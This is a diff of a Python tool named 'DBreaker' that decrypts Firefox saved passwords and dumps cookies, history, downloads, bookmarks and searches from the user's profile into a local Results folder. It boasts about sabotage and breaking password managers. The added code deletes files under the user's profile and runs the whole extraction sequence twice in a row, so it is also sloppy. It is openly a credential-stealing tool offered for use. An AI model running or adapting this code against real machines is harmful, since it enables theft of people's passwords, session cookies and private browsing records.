@@ -4,12 +4,46 @@ from struct import unpack;from binascii import hexlify,unhexlify
 from rich.console import Console;from rich.table import Table;from rich.theme import Theme
 from Crypto.Cipher import DES3,AES;from Crypto.Util.number import long_to_bytes;from Crypto.Util.Padding import unpad 
 from time import sleep,localtime
-if os.name=='nt':pass
-else:exit(f'[!] Sorry, Your System is Not Supported - {os.name}')
 custom_theme=Theme({'success': 'green', 'error': 'bold red'})
 console=Console(theme=custom_theme)
 
+def Main():
+    os.system('cls')
+    console.print(f"""
+██████╗       ██████╗ ██████╗ ███████╗ █████╗ ██╗  ██╗███████╗██████╗ 
+██╔══██╗      ██╔══██╗██╔══██╗██╔════╝██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
+██║  ██║█████╗██████╔╝██████╔╝█████╗  ███████║█████╔╝ █████╗  ██████╔╝
+██║  ██║╚════╝██╔══██╗██╔══██╗██╔══╝  ██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗
+██████╔╝      ██████╔╝██║  ██║███████╗██║  ██║██║  ██╗███████╗██║  ██║
+╚═════╝       ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+
+                    [bold white] By @TweakPY - @vv1ck [/bold white]                                         
+""",style='error',justify='left')
+    words=[
+        "Master, I will not let you down, and I will break all the databases",
+        "Oh hello again, would you like a cup of coffee?",
+        "I'm not good at serving anyone but I can tell you I'm good at sabotaging anything and anyone",
+        "Do you want to try something new today, for example,  prove that browsers are not safe?",
+        "I'm fine, thanks for not asking",
+        "I knew you would come",
+        "Sabotage is what I do",
+        "I don't like to tell you this but you are not safe if you are using a 'password manager'.",
+        "Take the risk or lose the chance",
+        "Whatever you do, do it well.",
+        "Do not waste your time ~",
+        "Nothing for now"
+        ]  
+    console.print(
+    random.choice(words),
+    ":coffee:"+'\n\n',
+    justify='left',
+    style='error',
+    )
+    
+username = os.getenv("USERNAME")
+
 def Firefox_Login():
+    # Decryption algorithm copied from https://github.com/lclevy/firepwd
     done=50
     oidValues={b'2a864886f70d010c050103': '1.2.840.113549.1.12.5.1.3 pbeWithSha1AndTripleDES-CBC',b'2a864886f70d0307':'1.2.840.113549.3.7 des-ede3-cbc',b'2a864886f70d010101':'1.2.840.113549.1.1.1 pkcs-1',b'2a864886f70d01050d':'1.2.840.113549.1.5.13 pkcs5 pbes2', b'2a864886f70d01050c':'1.2.840.113549.1.5.12 pkcs5 PBKDF2',b'2a864886f70d0209':'1.2.840.113549.2.9 hmacWithSHA256',b'60864801650304012a':'2.16.840.1.101.3.4.1.42 aes256-CBC'}   
     CKA_ID=unhexlify('f8000000000000000000000000000001')
@@ -265,6 +299,7 @@ def Firefox_History(main_db2):
         with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Mozilla Firefox History:{i}:❌\n')
         console.print("[+] We're [error]sorry[/error], but we couldn't get the Mozilla Firefox history  ! ");pass
     
+
 def Firefox_Downloads(main_db2):
     try:
         i=0
@@ -316,3 +351,114 @@ def Firefox_lastsearch(main_db2):
     except Exception as e:
         with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'Mozilla Firefox lastsearch:{i}:❌\n')
         console.print("[+] We're [error]sorry[/error], but we couldn't get the Mozilla Firefox LastSearch  ! ");pass
+
+def Temp_Remover():
+    try:
+        i=0;console.print('\n')
+        path=os.environ['USERPROFILE']+'\Temp'
+        for file in os.listdir(path):
+            sleep(0.2)
+            console.log(f' -- {file} Has been Removed ! ')
+            os.remove(path+"/"+file)
+            i+=1
+        sleep(0.2)
+        console.log(f' -- {path} Has been Removed ! ')
+        os.removedirs(path)
+        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'DBreaker Temp Files Clean up:{i}:✅\n')
+        click.secho('[!] Completed successfully !', fg='green') 
+    except PermissionError:
+        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'DBreaker Temp Files Clean up:{i}:❌\n');pass
+    except FileNotFoundError:
+        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'DBreaker Temp Files Clean up:{i}:❌\n');pass
+        
+def Old_ResultRemover():
+    try:
+        path=os.environ['USERPROFILE']+'\Results'
+        if not os.listdir(path):
+            pass
+        else:
+            i=0;console.print("\n[-] Old Files were Detected in The Results File, Removal is in Progress ..",style='error')
+            if not os.path.exists("Results/Mozilla Firefox"):pass
+            else:
+                console.print('\n')
+            if not os.path.exists("Results/Mozilla Firefox"):pass
+            else:
+                console.print('\n')
+                for file in os.listdir(path+"\Mozilla Firefox"):
+                    sleep(0.2)
+                    console.log(f' -- {file} Has been Removed ! ')
+                    os.remove(path+"\Mozilla Firefox"+"/"+file)
+                    i+=1
+                sleep(0.2)
+            with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'DBreaker Old Results Files Clean up:{i}:✅\n')
+    except PermissionError:
+        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'DBreaker Old Results Files Clean up:{i}:❌\n');pass
+    except FileNotFoundError:
+        with open('Results/Results.txt','a',encoding="utf-8") as f:f.write(f'DBreaker Old Results Files Clean up:{i}:❌\n');pass
+    
+    Main()
+
+def Result():
+    Main()
+    console.print("[bold magenta]Results [/bold magenta]!", "💻")
+    table=Table(show_header=True, header_style="bold blue")
+    table.add_column("ID", style="dim",width=6)
+    table.add_column("Operation",min_width=20)
+    table.add_column("Count",min_width=12,justify="right")
+    table.add_column("Status",min_width=12,justify="right")
+    for id,operation in enumerate(open('Results/Results.txt','r',encoding="utf-8").read().splitlines(),start=1):
+        operations=operation.split(":")[0]
+        count=operation.split(":")[1]
+        status=operation.split(":")[2]
+        table.add_row(f'{id}',f'[error]{operations}[/error]',f"[bold Yellow]{count}[/bold Yellow]",f'[bold green]{status}[/bold green]')
+    console.print(table);console.print('- Done in: {[bold green] '+f'{str(localtime().tm_hour)+":"+str(localtime().tm_min)+":"+str(localtime().tm_sec)+":"+str(localtime().tm_year)+":"+str(localtime().tm_mon)+":"+str(localtime().tm_mday)}'+' [/bold green]}\n');console.print('- Output in: {[bold green] '+os.getcwd()+r"\Results"+"[/bold green] }\n")
+    try:os.remove('Results/Results.txt')
+    except:pass
+        
+        
+def Core():
+    Main()
+    console.print("[error]Browsers [/error]", "💻",'\n');table=Table(show_header=True,header_style="bold dim");table.add_column("ID", style="dim",width=6);table.add_column("Browser",style='bold blue',min_width=20);table.add_row('1','Google Chrome');table.add_row('2','Mozilla Firefox');table.add_row('3','Microsoft Edge');table.add_row('4','Brave');table.add_row('5','Opera');table.add_row('6','Select All');console.print(table);bw=int(input("\n[?] Enter The Browser ID : "))
+    
+    if not os.path.exists("Results/"):os.makedirs("Results/")
+    if not os.path.exists("Temp/"):os.makedirs("Temp/")
+    if os.path.exists('Results/Results.txt')==True:
+        try:os.remove('Results/Results.txt')
+        except:pass
+        
+    
+    
+    #Check for old files    
+    Old_ResultRemover()
+
+        #Mozilla Firefox
+    if not os.path.exists("Results/Mozilla Firefox"):os.makedirs("Results/Mozilla Firefox")
+    temp_db=os.getenv('APPDATA')+"\\Mozilla\\Firefox\\Profiles\\"
+    for name in os.listdir(temp_db):main_db2=temp_db+name
+    Firefox_Login()
+    Firefox_Cookies(main_db2)
+    Firefox_History(main_db2)
+    Firefox_Downloads(main_db2)
+    Firefox_Bookmarks(main_db2)
+    Firefox_lastsearch(main_db2)
+    
+    if not os.path.exists("Results/Mozilla Firefox"):os.makedirs("Results/Mozilla Firefox")
+        
+        
+        
+    temp_db=os.getenv('APPDATA')+"\\Mozilla\\Firefox\\Profiles\\"
+    for name in os.listdir(temp_db):main_db2=temp_db+name
+    Firefox_Login()
+    Firefox_Cookies(main_db2)
+    Firefox_History(main_db2)
+    Firefox_Downloads(main_db2)
+    Firefox_Bookmarks(main_db2)
+    Firefox_lastsearch(main_db2)
+        
+    sleep(2);Main()
+    if click.confirm('[+] Done, Do you want to clean Temporary Files ☕ ',default=True,show_default=True):Temp_Remover()
+    sleep(2);Result()
+    
+    
+    
+Core()
